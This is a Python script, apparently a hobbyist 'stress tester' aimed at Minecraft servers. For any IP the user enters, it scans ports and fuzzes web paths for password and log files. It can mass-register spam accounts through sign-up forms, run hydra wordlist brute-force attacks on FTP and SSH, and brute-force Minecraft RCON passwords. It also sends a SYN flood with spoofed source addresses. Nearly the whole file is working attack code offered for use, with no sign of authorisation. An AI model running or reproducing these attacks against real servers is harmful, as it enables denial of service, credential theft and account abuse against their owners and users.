from colorama import Fore, init
import requests
from scapy.all import *
from random import randint
import mechanize
import string
from scapy.layers.inet import TCP, IP
from mcrcon import MCRcon
import linecache

Fore.LR = Fore.LIGHTRED_EX
Fore.LG = Fore.LIGHTGREEN_EX
Fore.W = Fore.LIGHTWHITE_EX
Fore.B = Fore.BLUE
Fore.LB = Fore.LIGHTBLUE_EX
Fore.R = Fore.RESET
Fore.Y = Fore.YELLOW
Fore.LBEX = Fore.LIGHTBLACK_EX
Fore.LWEX = Fore.LIGHTWHITE_EX
init()

# ----------------------------------------------------------------------------------------------------------
# files/folders that fuzzer searches for
dirs = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'login/', 'sql/', 'robots.txt',
        'credentials/', 'secret/', 'videos/', 'images/', 'js/', 'scripts/', 'style/', 'Login/', 'Register/',
        'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/', 'minecraft/',
        'rules/', 'vote/', 'search/', 'realms/', 'about/', 'Account/', '.htaccess', 'data/', 'logins/', 'admin/',
        'accounts/', 'access/', 'assets/', 'ghost/', 'p/', 'email/', 'Useless/', 'account/', 'register.php',
        'Register.php', 'index.php']

spammable_pages = ['register.php', 'Register.php', 'index.php', 'reg.php', 'Reg.php']
other_files = ['log.txt', 'logs.txt', 'messages.txt', 'index.html', 'index.php', 'passwords.txt', 'password.txt']
misc_dirs = ['database/', 'data/', 'admin/', 'logs/', 'log/']
directories = ['Register/', 'register/', 'account/', 'Account/', 'database/', 'data/', 'admin/', 'logs/', 'log/']
account_dirs = ['Account/', 'Register/', 'register/', 'Profile/', 'profile/', 'user/', 'account/', 'User/']
# ----------------------------------------------------------------------------------------------------------

FTP = False
SSH = False
Website = False
Server = False

os.system('clear')
os.system('cls')
print(f'''


{Fore.LIGHTGREEN_EX}

░██████╗████████╗██████╗░███████╗░██████╗░██████╗░░░░░░████████╗███████╗░██████╗████████╗███████╗██████╗░
██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝░░░░░░╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
╚█████╗░░░░██║░░░██████╔╝█████╗░░╚█████╗░╚█████╗░█████╗░░░██║░░░█████╗░░╚█████╗░░░░██║░░░█████╗░░██████╔╝
░╚═══██╗░░░██║░░░██╔══██╗██╔══╝░░░╚═══██╗░╚═══██╗╚════╝░░░██║░░░██╔══╝░░░╚═══██╗░░░██║░░░██╔══╝░░██╔══██╗
██████╔╝░░░██║░░░██║░░██║███████╗██████╔╝██████╔╝░░░░░░░░░██║░░░███████╗██████╔╝░░░██║░░░███████╗██║░░██║
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░░░░░░░░░░╚═╝░░░╚══════╝╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░

Maded by @KiloSheet

    ''')

PORTS = {21: 'FTP',  # Ports to scan
         22: 'SSH',
         23: 'TELNET',
         53: 'DNS',
         80: 'HTTP',
         443: 'HTTPS',
         3389: 'RDP',
         8080: 'ALT HTTP',
         8192: 'Dynmap',
         19132: 'Bedrock',
         25565: 'JavaServer'}


def syn_flood(dst_ip: str, dst_port: int):
    ip_packet = IP()
    ip_packet.src = ".".join(map(str, [randint(0, 255) for _ in range(4)]))
    ip_packet.dst = dst_ip

    tcp_packet = TCP()
    tcp_packet.sport = randint(1000, 9000)
    tcp_packet.dport = dst_port
    tcp_packet.flags = "S"
    tcp_packet.seq = randint(1000, 9000)
    tcp_packet.window = randint(1000, 9000)

    send(ip_packet / tcp_packet, verbose=0)


def ddos_threading(dst_ip):
    counter = int(input("               How many packets do you want to send: "))
    dst_port = int(input("               Target Port: "))

    print("               Packets are sending...")
    for i in range(counter):
        ddos_thread = threading.Thread(target=syn_flood, args=[dst_ip, dst_port], daemon=True)
        print(f'               {Fore.LB}[{i}]{Fore.W} Sent packet to {Fore.LIGHTYELLOW_EX}{dst_ip}:{dst_port}{Fore.W}')
        time.sleep(0.001)
        ddos_thread.start()
    print(f"\n               Total packets sent: {counter}\n")


ip = input('            IP: ')
print('')
print('')

for port in PORTS:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)  # Terminate connection if no response after 3 seconds
    result = s.connect_ex((ip, port))

    if result == 0:
        if port == 21:
            FTP = True
        if port == 22:
            SSH = True
        if port == 80:
            Website = True
        if port == 25565:
            Server = True
        print(f'{Fore.LG}       [+]{Fore.W} Port {port} is open on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
        s.close()

    else:
        print(
            f'{Fore.LR}       [-]{Fore.W} Port {port} is closed on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
        s.close()

resp = requests.get(f'https://api.mcsrvstat.us/2/{ip}')  # Query the server status API
print('')

SRV = resp.json().get("srv")
SERVER_IP = resp.json().get("ip")
ONLINE_MODE = resp.json().get("online")
VERSION = resp.json().get("version")
QUERY = resp.json().get("query")

print(f'''
            {Fore.RED}Query:{Fore.R} {QUERY}
            {Fore.RED}Version:{Fore.R} {VERSION}
            {Fore.RED}Online Mode:{Fore.R} {ONLINE_MODE}
            {Fore.RED}Server IP:{Fore.R} {SERVER_IP}
            {Fore.RED}SRV:{Fore.R} {SRV}
''')


def fuzz():
    for directory in dirs:
        fuzz_url = f'http://{ip}/{directory}'
        status = requests.get(fuzz_url, headers=user_agent).status_code

        if status == 200:
            meaning = '[OK]'
            color = Fore.LIGHTGREEN_EX

            if directory in directories:
                ask_more = input(f'                 Do you want to find more about "{directory}"? y/n: ')

                if ask_more == 'y':
                    if directory in misc_dirs:
                        for other_file in other_files:
                            other_fuzz_url = f'http://{ip}/{directory}{other_file}'
                            misc_status = requests.get(str(other_fuzz_url), headers=user_agent).status_code

                            if misc_status == 200:
                                meaning = '[OK]'
                                color = Fore.LIGHTGREEN_EX
                                print(
                                    f'                    {color}[{misc_status}] {meaning} {Fore.W}{other_fuzz_url}{Fore.W}')

                            elif misc_status == 404:
                                meaning = '[Not Found]'
                                color = Fore.LIGHTRED_EX
                                print(
                                    f'                    {color}[{misc_status}] {meaning} {Fore.W}{other_fuzz_url}{Fore.W}')

                    if directory in account_dirs:
                        valid_pages = []
                        count = 0
                        for account_file in spammable_pages:
                            short_fuzz_url = f'http://{ip}/{directory}{account_file}'
                            page_status = requests.get(str(short_fuzz_url), headers=user_agent).status_code

                            if page_status == 200:
                                print(f'                    {Fore.LB} [{count}] {Fore.W}{account_file}{Fore.W}')
                                valid_pages.append(account_file)
                                count += 1

                        ask_account_creation = input('                    Do you want to spam create accounts? y/n: ')

                        if ask_account_creation == 'y':
                            page_no = input('                    Choose page number: ')
                            account_count = input('                    How many accounts to create?: ')

                            reg_page = valid_pages[int(page_no)]
                            letters = ['m', 'y', 'a', 's', 'h', 'u', 'r', 't', 'c', 'b', 'd', 'e', 'f', 'g', 'i', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']

                            for amount in range(int(account_count)):
                                random1 = random.choice(letters)
                                url = f'http://{ip}/{directory}/{reg_page}'

                                lower = string.ascii_lowercase
                                username = ''.join(random.choice(lower) for i in range(10))
                                email = random1+'@gmail.com'
                                password = ''.join(
                                    [random.choice(string.ascii_letters + string.digits + string.punctuation) for n
                                     in range(16)])

                                br = mechanize.Browser()

                                br.set_handle_equiv(True)
                                br.set_handle_redirect(True)
                                br.set_handle_referer(True)
                                br.set_handle_robots(False)
                                br.set_handle_robots(False)
                                br.open(url, timeout=5)
                                br.addheaders = [('User-agent',
                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')]

                                br.select_form(nr=0)

                                br.form['username'] = username
                                br.form['email'] = email
                                br.form['password1'] = password
                                br.form['password2'] = password

                                br.submit()
                                time.sleep(0.3)
                                nexturl = br.geturl()
                                if url == nexturl:
                                    print(f'''
                                    +------------------------------------------------------------------------+            
                                    | {Fore.LG}[{amount}]{Fore.LR} Failed to create account!{Fore.W}
                                    +''')
                                else:
                                    print(f'''
                     +------------------------------------------------------------------------+            
                     | {Fore.LG}[{amount}]{Fore.W} Account created:{Fore.LB} {nexturl}{Fore.W}
                     | Username ---> {Fore.LB}{username}{Fore.W}
                     | Email ---> {Fore.LB}{email}{Fore.W}
                     | Password ---> {Fore.LB}{password}{Fore.W}
                     +''')
            else:
                meaning = '[OK]'
                color = Fore.LG

        elif status == 403:
            meaning = '[Forbidden]'
            color = Fore.RED

        elif status == 404:
            meaning = '[Not Found]'
            color = Fore.LR

        elif status == 429:
            meaning = '[Too Many Requests]'
            color = Fore.LIGHTYELLOW_EX

        else:
            meaning = '[Unknown]'
            color = Fore.Y

        print(f'            {color}[{status}] {meaning} {Fore.W}{fuzz_url}')

        time.sleep(0.1)


if Website:
    WebASK = input('            Do you want to find information about website? y/n: ')
    if WebASK == 'y':
        user_agent = {
            'User-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060313 Debian/1.5.dfsg+1.5.0.1-4 Firefox/1.5.0.1'}
        r = requests.get(f'http://{ip}', headers=user_agent)
        print('')

        for res in r.history:
            print(f'            {Fore.LB}[{r.status_code}]{Fore.W} Redirected to{Fore.LWEX} {res.url}')

        try:
            d = requests.head(f'http://{ip}', headers=user_agent)
            print(f'''
                    {Fore.LB}Server:{Fore.W} {d.headers["server"]}
                    {Fore.LB}Content type:{Fore.W} {d.headers["content-type"]}
            ''')
            print('')
        except KeyError:
            print(f'                    {Fore.LR}[!]{Fore.W} Cant get information about website!')
            pass

        fuzzask = input('            Do you want to fuzz the site? y/n: ')
        if fuzzask == 'y':
            fuzz()

        else:
            print('               Ok.')

    else:
        print('               Ok.')

if FTP:
    print('')
    FTPASK = input('            Do you want to Wordlist attack on FTP? y/n: ')

    if FTPASK == 'y':
        the_proto = 'ftp'
        ftp_username_wordlist = input('             Username Wordlist: ')
        ftp_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ftp_username_wordlist} -P {ftp_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')

    else:
        print('''               Ok.''')

if SSH:
    print('')
    SSHASK = input('            Do you want to Wordlist attack on SSH? y/n: ')

    if SSHASK == 'y':
        the_proto = 'ssh'
        ssh_username_wordlist = input('             Username Wordlist: ')
        ssh_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ssh_username_wordlist} -P {ssh_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')

    else:
        print('''               Ok.''')

if Server:
    print('')
    rcon_attack = input('            Do you want to Wordlist attack RCON? y/n: ')
    if rcon_attack == 'y':
        count = 1

        f = open('rcon_passwords.txt')
        amount_lines = len(f.readlines())
        line = f.readlines()
        while count < amount_lines:
            password = linecache.getline(r'rcon_passwords.txt', count)
            print(f'                    {Fore.Y}[*]{Fore.W} Trying {Fore.LB}{ip}:{password}{Fore.W}')
            try:
                with MCRcon(ip, password, 25575, timeout=30) as mcr:
                    print(f'                    {Fore.LG}[+]{Fore.W} Valid {Fore.LB}{ip}:{password}{Fore.W}')
                    mcr.disconnect()
                    break
            except TimeoutError:
                print(f'                    {Fore.RED}[!]{Fore.W} Invalid {Fore.LB}{ip}:{password}{Fore.W}')
            except ConnectionRefusedError:
                print(f'                    {Fore.RED}[!]{Fore.W}{ip}{Fore.RED} Refused Connection{Fore.W}')
                break
            except KeyboardInterrupt:
                print(f'                    {Fore.RED}Interrupted{Fore.W}')
                break
            count += 1

    else:
        print(f'                 {Fore.LR}[!]{Fore.W} No RCON Running on port 25575')

time.sleep(0.3)
ddos_ask = input('        Do you want to send packets? y/n: ')

if ddos_ask == 'y':
    dst_ip = ip
    ddos_threading(dst_ip)

else:
    print('               Ok.')
